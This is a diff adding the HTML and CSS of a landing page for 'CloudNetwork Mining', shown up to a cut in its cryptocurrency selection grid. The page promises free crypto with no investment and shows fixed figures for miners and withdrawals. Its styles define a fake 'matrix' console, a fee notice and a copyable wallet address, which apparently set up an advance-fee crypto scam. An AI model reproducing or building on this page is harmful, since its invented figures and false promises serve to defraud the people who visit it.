@@ -1,0 +1,1506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CloudNetwork Mining - Professional Cloud Mining</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Courier New', 'Consolas', monospace;
+      background: #0a0e27;
+      min-height: 100vh;
+      color: #00ff41;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        repeating-linear-gradient(
+          0deg,
+          rgba(0, 255, 65, 0.03) 0px,
+          transparent 1px,
+          transparent 2px,
+          rgba(0, 255, 65, 0.03) 3px
+        );
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .container {
+      position: relative;
+      z-index: 2;
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* Header */
+    header {
+      padding: 30px 0;
+      text-align: center;
+      border-bottom: 2px solid #00ff41;
+      box-shadow: 0 2px 20px rgba(0, 255, 65, 0.3);
+    }
+
+    .logo {
+      font-size: 42px;
+      font-weight: 900;
+      letter-spacing: 3px;
+      color: #00ff41;
+      margin-bottom: 10px;
+      text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41;
+      animation: glitch 3s infinite;
+    }
+
+    @keyframes glitch {
+      0%, 90%, 100% {
+        text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41;
+      }
+      95% {
+        text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41, -2px 0 #ff00ff, 2px 0 #00ffff;
+      }
+    }
+
+    .tagline {
+      font-size: 16px;
+      color: #00cc33;
+      font-weight: 600;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    /* Hero Section */
+    .hero {
+      text-align: center;
+      padding: 80px 0;
+      animation: fadeInUp 0.8s ease;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .hero h1 {
+      font-size: 56px;
+      font-weight: 900;
+      line-height: 1.2;
+      margin-bottom: 30px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+      letter-spacing: 2px;
+    }
+
+    .hero p {
+      font-size: 20px;
+      color: #00cc33;
+      margin-bottom: 40px;
+      line-height: 1.6;
+    }
+
+    /* Features Section */
+    .features-section {
+      text-align: center;
+      margin: 80px 0 60px;
+      padding: 60px 20px;
+      background: rgba(0, 255, 65, 0.03);
+      border-top: 2px solid #00ff41;
+      border-bottom: 2px solid #00ff41;
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.2);
+    }
+
+    .features-section h2 {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 60px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+      letter-spacing: 3px;
+    }
+
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 40px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .feature-card {
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 15px;
+      padding: 40px 30px;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .feature-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+      transform: rotate(45deg);
+      transition: all 0.6s;
+    }
+
+    .feature-card:hover::before {
+      left: 100%;
+    }
+
+    .feature-card:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.5), inset 0 0 30px rgba(0, 255, 65, 0.1);
+      border-color: #00ffff;
+    }
+
+    .feature-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+      filter: drop-shadow(0 0 15px #00ff41);
+      position: relative;
+      z-index: 2;
+    }
+
+    .feature-card h3 {
+      font-size: 24px;
+      font-weight: 800;
+      color: #00ff41;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #00ff41;
+      position: relative;
+      z-index: 2;
+    }
+
+    .feature-card p {
+      font-size: 16px;
+      line-height: 1.7;
+      color: #00cc33;
+      position: relative;
+      z-index: 2;
+      text-align: left;
+    }
+
+    .feature-card p strong {
+      color: #00ff41;
+      text-shadow: 0 0 10px #00ff41;
+      font-weight: 900;
+    }
+
+    /* Stats Section */
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 30px;
+      margin: 60px 0;
+      padding: 0 20px;
+    }
+
+    .stat-card {
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      padding: 40px 30px;
+      text-align: center;
+      transition: all 0.3s;
+      animation: fadeInUp 0.8s ease;
+      box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
+    }
+
+    .stat-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.5), inset 0 0 30px rgba(0, 255, 65, 0.1);
+      border-color: #00ffff;
+    }
+
+    .stat-number {
+      font-size: 48px;
+      font-weight: 900;
+      color: #00ff41;
+      margin-bottom: 10px;
+      text-shadow: 0 0 15px #00ff41;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      color: #00cc33;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+
+    /* Crypto Grid */
+    .crypto-section {
+      text-align: center;
+      margin: 60px 0;
+    }
+
+    .crypto-section h2 {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 50px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+      letter-spacing: 3px;
+    }
+
+    .crypto-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 25px;
+      padding: 0 20px;
+      margin-bottom: 50px;
+    }
+
+    .crypto-card {
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 15px;
+      padding: 35px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px rgba(0, 255, 65, 0.2), inset 0 0 15px rgba(0, 255, 65, 0.05);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .crypto-card::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+      transform: rotate(45deg);
+      transition: all 0.5s;
+    }
+
+    .crypto-card:hover::before {
+      left: 100%;
+    }
+
+    .crypto-card:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.5), inset 0 0 30px rgba(0, 255, 65, 0.1);
+      border-color: #00ffff;
+    }
+
+    .crypto-card.selected {
+      background: rgba(0, 255, 65, 0.15);
+      border-color: #00ffff;
+      box-shadow: 0 0 50px rgba(0, 255, 255, 0.6), inset 0 0 30px rgba(0, 255, 65, 0.2);
+    }
+
+    .crypto-logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 20px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .crypto-name {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 5px;
+      color: #00ff41;
+      position: relative;
+      z-index: 2;
+    }
+
+    .crypto-symbol {
+      font-size: 14px;
+      color: #00cc33;
+      font-weight: 600;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Amount Section */
+    .amount-section {
+      text-align: center;
+      margin: 60px 0;
+      animation: fadeInUp 0.8s ease;
+    }
+
+    .amount-section h2 {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 50px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+      letter-spacing: 3px;
+    }
+
+    .amount-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 25px;
+      padding: 0 20px;
+      margin-bottom: 40px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .amount-card {
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 15px;
+      padding: 50px 20px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0, 255, 65, 0.2), inset 0 0 15px rgba(0, 255, 65, 0.05);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .amount-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
+      transition: all 0.5s;
+    }
+
+    .amount-card:hover::before {
+      left: 100%;
+    }
+
+    .amount-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.5), inset 0 0 30px rgba(0, 255, 65, 0.1);
+      border-color: #00ffff;
+    }
+
+    .amount-card.selected {
+      background: rgba(0, 255, 65, 0.15);
+      border-color: #00ffff;
+      box-shadow: 0 0 50px rgba(0, 255, 255, 0.6), inset 0 0 30px rgba(0, 255, 65, 0.2);
+    }
+
+    .amount-crypto {
+      font-size: 42px;
+      font-weight: 900;
+      margin-bottom: 0;
+      color: #00ff41;
+      text-shadow: 0 0 15px #00ff41;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Wallet Section */
+    .wallet-section {
+      text-align: center;
+      margin: 60px 0;
+      animation: fadeInUp 0.8s ease;
+    }
+
+    .wallet-section h2 {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 20px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+      letter-spacing: 3px;
+    }
+
+    .wallet-input-container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .wallet-input {
+      width: 100%;
+      padding: 20px 25px;
+      font-size: 16px;
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      color: #00ff41;
+      font-family: 'Courier New', monospace;
+      transition: all 0.3s;
+      margin-bottom: 20px;
+      box-shadow: 0 0 15px rgba(0, 255, 65, 0.2), inset 0 0 10px rgba(0, 255, 65, 0.05);
+    }
+
+    .wallet-input:focus {
+      outline: none;
+      border-color: #00ffff;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.5), inset 0 0 20px rgba(0, 255, 65, 0.1);
+    }
+
+    .wallet-input::placeholder {
+      color: rgba(0, 255, 65, 0.4);
+    }
+
+    .hint {
+      color: #00cc33;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    /* Buttons */
+    .btn {
+      padding: 18px 50px;
+      font-size: 18px;
+      font-weight: 700;
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+      font-family: 'Courier New', monospace;
+    }
+
+    .btn-primary {
+      background: #00ff41;
+      color: #0a0e27;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.6);
+      background: #00ffff;
+      border-color: #00ffff;
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.3;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-secondary {
+      background: rgba(0, 255, 65, 0.1);
+      border: 2px solid #00ff41;
+      color: #00ff41;
+      margin-left: 15px;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(0, 255, 65, 0.2);
+      border-color: #00ffff;
+      color: #00ffff;
+    }
+
+    /* Hero Button */
+    .btn-hero {
+      padding: 20px 60px;
+      font-size: 22px;
+      font-weight: 900;
+      border: 3px solid #00ff41;
+      border-radius: 15px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      font-family: 'Courier New', monospace;
+      background: #00ff41;
+      color: #0a0e27;
+      box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
+      position: relative;
+      overflow: hidden;
+      animation: pulse 2s infinite;
+      transition: all 0.3s;
+      display: inline-flex;
+      align-items: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        box-shadow: 0 0 30px rgba(0, 255, 65, 0.6);
+      }
+      50% {
+        box-shadow: 0 0 50px rgba(0, 255, 65, 1), 0 0 80px rgba(0, 255, 65, 0.5);
+      }
+    }
+
+    .btn-hero::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+
+    .btn-hero:hover::before {
+      width: 300px;
+      height: 300px;
+    }
+
+    .btn-hero:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 60px rgba(0, 255, 255, 1), 0 0 100px rgba(0, 255, 255, 0.5);
+      background: #00ffff;
+      border-color: #00ffff;
+    }
+
+    .btn-text {
+      position: relative;
+      z-index: 2;
+    }
+
+    .btn-arrow {
+      position: relative;
+      z-index: 2;
+      font-size: 28px;
+      animation: bounce-arrow 2s infinite;
+    }
+
+    @keyframes bounce-arrow {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(5px);
+      }
+    }
+
+    /* MATRIX LOADING SCREEN */
+    .loading-screen-wrapper {
+      display: none;
+      background: #000000;
+      min-height: 100vh;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 9999;
+    }
+
+    .loading-screen-wrapper.active {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .matrix-canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+    }
+
+    .matrix-content {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      max-width: 900px;
+      width: 90%;
+      padding: 40px;
+    }
+
+    .matrix-title {
+      font-size: 36px;
+      font-weight: 900;
+      color: #00ff00;
+      margin-bottom: 40px;
+      text-shadow: 0 0 20px #00ff00;
+      font-family: 'Courier New', monospace;
+    }
+
+    .matrix-status {
+      font-size: 18px;
+      color: #00ff00;
+      margin-bottom: 30px;
+      font-family: 'Courier New', monospace;
+      text-shadow: 0 0 10px #00ff00;
+    }
+
+    .matrix-console {
+      background: rgba(0, 20, 0, 0.9);
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      padding: 20px;
+      height: 400px;
+      overflow-y: auto;
+      text-align: left;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.4);
+      line-height: 1.5;
+    }
+
+    .matrix-line {
+      color: #00ff00;
+      margin-bottom: 5px;
+      line-height: 1.6;
+      text-shadow: 0 0 5px #00ff00;
+    }
+
+    /* Success Screen */
+    .success-screen {
+      text-align: center;
+      padding: 80px 20px;
+      animation: fadeInUp 0.8s ease;
+    }
+
+    .success-icon {
+      font-size: 100px;
+      margin-bottom: 30px;
+      animation: bounce 1s ease;
+      filter: drop-shadow(0 0 20px #00ff41);
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+
+    .success-screen h2 {
+      font-size: 42px;
+      font-weight: 900;
+      margin-bottom: 30px;
+      color: #00ff41;
+      text-shadow: 0 0 20px #00ff41;
+    }
+
+    .info-box {
+      max-width: 700px;
+      margin: 40px auto;
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 15px;
+      padding: 35px;
+      box-shadow: 0 0 30px rgba(0, 255, 65, 0.3), inset 0 0 20px rgba(0, 255, 65, 0.05);
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+      gap: 20px;
+    }
+
+    .info-row:last-child {
+      margin-bottom: 0;
+      padding-bottom: 0;
+      border-bottom: none;
+    }
+
+    .info-label {
+      font-size: 16px;
+      color: #00cc33;
+      font-weight: 600;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .info-value {
+      font-size: 14px;
+      font-weight: 700;
+      text-align: right;
+      word-break: break-all;
+      color: #00ff41;
+      line-height: 1.6;
+      flex: 1;
+    }
+
+    .fee-notice {
+      max-width: 700px;
+      margin: 40px auto;
+      background: rgba(0, 255, 65, 0.08);
+      border: 3px solid #00ff41;
+      border-radius: 20px;
+      padding: 45px;
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.4);
+    }
+
+    .fee-notice .icon {
+      font-size: 70px;
+      margin-bottom: 20px;
+      filter: drop-shadow(0 0 20px #00ff41);
+    }
+
+    .fee-notice h3 {
+      font-size: 32px;
+      font-weight: 900;
+      color: #00ff41;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px #00ff41;
+    }
+
+    .fee-notice p {
+      font-size: 16px;
+      line-height: 1.7;
+      margin-bottom: 25px;
+      color: #00cc33;
+    }
+
+    .fee-amount {
+      font-size: 48px;
+      font-weight: 900;
+      color: #00ff41;
+      margin: 25px 0;
+      text-shadow: 0 0 30px #00ff41;
+    }
+
+    .wallet-box {
+      background: rgba(0, 255, 65, 0.05);
+      border: 2px solid #00ff41;
+      border-radius: 15px;
+      padding: 25px;
+      margin-top: 25px;
+      box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+    }
+
+    .wallet-box-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #00ff41;
+      margin-bottom: 15px;
+    }
+
+    .wallet-address {
+      background: #000000;
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      padding: 15px;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      color: #00ff41;
+      word-break: break-all;
+      font-weight: 600;
+      margin-bottom: 15px;
+      box-shadow: 0 0 15px rgba(0, 255, 65, 0.3), inset 0 0 10px rgba(0, 255, 65, 0.1);
+    }
+
+    .copy-btn {
+      width: 100%;
+      padding: 12px;
+      background: #00ff41;
+      color: #0a0e27;
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 16px;
+      transition: all 0.3s;
+      font-family: 'Courier New', monospace;
+      box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+    }
+
+    .copy-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 40px rgba(0, 255, 65, 0.6);
+      background: #00ffff;
+      border-color: #00ffff;
+    }
+
+    .wallet-note {
+      font-size: 13px;
+      color: #00cc33;
+      margin-top: 15px;
+      text-align: center;
+    }
+
+    .screen {
+      display: none;
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .hero h1 {
+        font-size: 36px;
+      }
+
+      .hero p {
+        font-size: 18px;
+      }
+
+      .crypto-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .amount-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .btn-secondary {
+        margin-left: 0;
+        margin-top: 15px;
+        display: block;
+        width: 100%;
+      }
+
+      .info-row {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .info-value {
+        text-align: left;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-screen">
+    <div class="container">
+      <header>
+        <div class="logo">☁️ CloudNetwork Mining</div>
+        <div class="tagline">Professional Cloud Mining Platform</div>
+      </header>
+
+      <!-- Screen 1: Select Crypto -->
+      <div class="screen active" id="cryptoScreen">
+        <div class="hero">
+          <h1>Mine cryptocurrency in the cloud</h1>
+          <p>Professional cloud mining without hardware.<br>Start earning crypto today.</p>
+          <button class="btn btn-hero" onclick="scrollToCrypto()">
+            <span class="btn-text">Start Mining Now</span>
+            <span class="btn-arrow">↓</span>
+          </button>
+        </div>
+
+        <!-- Features Section -->
+        <div class="features-section">
+          <h2>>> What Does Our Cloud Miner Do?</h2>
+          
+          <div class="features-grid">
+            <div class="feature-card">
+              <div class="feature-icon">⚡</div>
+              <h3>Use Our Power!</h3>
+              <p>Mine cryptocurrency in the background while you're just chilling. Our algorithm remotely ensures maximum hash power even on low streams, so you can mine on any device with excellent performance.</p>
+            </div>
+
+            <div class="feature-card">
+              <div class="feature-icon">🕒</div>
+              <h3>Free Up Your Personal Time!</h3>
+              <p>Use our <strong>CLOUDNETWORK</strong> to mine cryptocurrency in the background and you won't have to do anything. Set it up once and let the system work for you 24/7.</p>
+            </div>
+
+            <div class="feature-card">
+              <div class="feature-icon">💰</div>
+              <h3>Earn Cryptocurrency for Free!</h3>
+              <p>Our technology allows you to earn various cryptocurrencies without any investment! Just choose a token, configure the service, and wait for the mining to complete.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="stats">
+          <div class="stat-card">
+            <div class="stat-number" id="usersCount">32,567</div>
+            <div class="stat-label">Active Miners</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="withdrawalsCount">451,892</div>
+            <div class="stat-label">Successful Withdrawals</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="tokensSent">38,941</div>
+            <div class="stat-label">Tokens Distributed</div>
+          </div>
+        </div>
+
+        <div class="crypto-section">
+          <h2>Select Cryptocurrency</h2>
+          <div class="crypto-grid">
+            <div class="crypto-card" onclick="selectCrypto('BTC')" data-crypto="BTC">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#f7931a"/>
+                <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.114-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.26l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.183-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313l-.858 1.978 2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.727.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538zm-3.95 5.538c-.533 2.147-4.148.986-5.32.695l.95-3.805c1.172.293 4.929.872 4.37 3.11zm.535-5.569c-.487 1.953-3.495.96-4.47.717l.86-3.45c.975.243 4.118.696 3.61 2.733z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Bitcoin</div>
+              <div class="crypto-symbol">BTC</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('ETH')" data-crypto="ETH">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#627eea"/>
+                <path d="M16.498 4v8.87l7.497 3.35z" fill="#fff" fill-opacity=".602"/>
+                <path d="M16.498 4L9 16.22l7.498-3.35z" fill="#fff"/>
+                <path d="M16.498 21.968v6.027L24 17.616z" fill="#fff" fill-opacity=".602"/>
+                <path d="M16.498 27.995v-6.028L9 17.616z" fill="#fff"/>
+                <path d="M16.498 20.573l7.497-4.353-7.497-3.348z" fill="#fff" fill-opacity=".2"/>
+                <path d="M9 16.22l7.498 4.353v-7.701z" fill="#fff" fill-opacity=".602"/>
+              </svg>
+              <div class="crypto-name">Ethereum</div>
+              <div class="crypto-symbol">ETH</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('BNB')" data-crypto="BNB">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#f3ba2f"/>
+                <path d="M16 6.5L13 9.5l3 3 3-3zm-7 6.5l-3 3 3 3 3-3zm7 1l-3 3 3 3 3-3zm7-1l-3 3 3 3 3-3zM16 20l-3 3 3 3 3-3z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">BNB</div>
+              <div class="crypto-symbol">BNB</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('SOL')" data-crypto="SOL">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#14f195"/>
+                <path d="M8.5 19.5L11 17h13l-2.5 2.5zm15-7L21 15H8l2.5-2.5zM8.5 16L11 13.5h13L21.5 16z" fill="#000"/>
+              </svg>
+              <div class="crypto-name">Solana</div>
+              <div class="crypto-symbol">SOL</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('XRP')" data-crypto="XRP">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#23292f"/>
+                <path d="M22.5 8h2.8l-5.9 5.9c-1.1 1.1-2.9 1.1-4 0L9.5 8h2.8l3.8 3.8c.5.5 1.3.5 1.8 0zM9.5 24H6.7l5.9-5.9c1.1-1.1 2.9-1.1 4 0l5.9 5.9h-2.8l-3.8-3.8c-.5-.5-1.3-.5-1.8 0z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Ripple</div>
+              <div class="crypto-symbol">XRP</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('ADA')" data-crypto="ADA">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#0033ad"/>
+                <circle cx="16" cy="12" r="2" fill="#fff"/>
+                <circle cx="16" cy="20" r="2" fill="#fff"/>
+                <circle cx="12" cy="16" r="1.5" fill="#fff"/>
+                <circle cx="20" cy="16" r="1.5" fill="#fff"/>
+                <circle cx="13" cy="13.5" r="1" fill="#fff"/>
+                <circle cx="19" cy="13.5" r="1" fill="#fff"/>
+                <circle cx="13" cy="18.5" r="1" fill="#fff"/>
+                <circle cx="19" cy="18.5" r="1" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Cardano</div>
+              <div class="crypto-symbol">ADA</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('DOGE')" data-crypto="DOGE">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#c2a633"/>
+                <path d="M13 11h4c2.2 0 4 1.8 4 4v2c0 2.2-1.8 4-4 4h-4v-2h4c1.1 0 2-.9 2-2v-2c0-1.1-.9-2-2-2h-4v6h-2V11h2v4h2v-4z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Dogecoin</div>
+              <div class="crypto-symbol">DOGE</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('USDT')" data-crypto="USDT">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#26a17b"/>
+                <path d="M17.5 12.5V10h-3v2.5h-4v2h4v2c-3 0-5.5.7-5.5 1.5s2.5 1.5 5.5 1.5 5.5-.7 5.5-1.5-2.5-1.5-5.5-1.5v-2h4v-2h-4z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Tether</div>
+              <div class="crypto-symbol">USDT</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('LTC')" data-crypto="LTC">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#345d9d"/>
+                <path d="M10.5 19.5l1.5-5.5-2 .5.5-2 2-.5L14 7h4l-1.5 5 2-.5-.5 2-2 .5-1 3.5h7l-.5 2h-11z" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Litecoin</div>
+              <div class="crypto-symbol">LTC</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('TRX')" data-crypto="TRX">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#eb0029"/>
+                <path d="M7 7l11 4 7 11-11-4-7-11z" fill="#fff"/>
+                <path d="M18 11l7 11-11-4 4-7z" fill="#fff" opacity="0.6"/>
+              </svg>
+              <div class="crypto-name">Tron</div>
+              <div class="crypto-symbol">TRX</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('DOT')" data-crypto="DOT">
+              <svg class="crypto-logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="16" cy="16" r="16" fill="#e6007a"/>
+                <circle cx="16" cy="8" r="2.5" fill="#fff"/>
+                <circle cx="16" cy="24" r="2.5" fill="#fff"/>
+                <circle cx="8" cy="16" r="2.5" fill="#fff"/>
+                <circle cx="24" cy="16" r="2.5" fill="#fff"/>
+                <circle cx="11" cy="11" r="2" fill="#fff"/>
+                <circle cx="21" cy="11" r="2" fill="#fff"/>
+                <circle cx="11" cy="21" r="2" fill="#fff"/>
+                <circle cx="21" cy="21" r="2" fill="#fff"/>
+              </svg>
+              <div class="crypto-name">Polkadot</div>
+              <div class="crypto-symbol">DOT</div>
+            </div>
+            <div class="crypto-card" onclick="selectCrypto('MATIC')" data-crypto="MATIC">
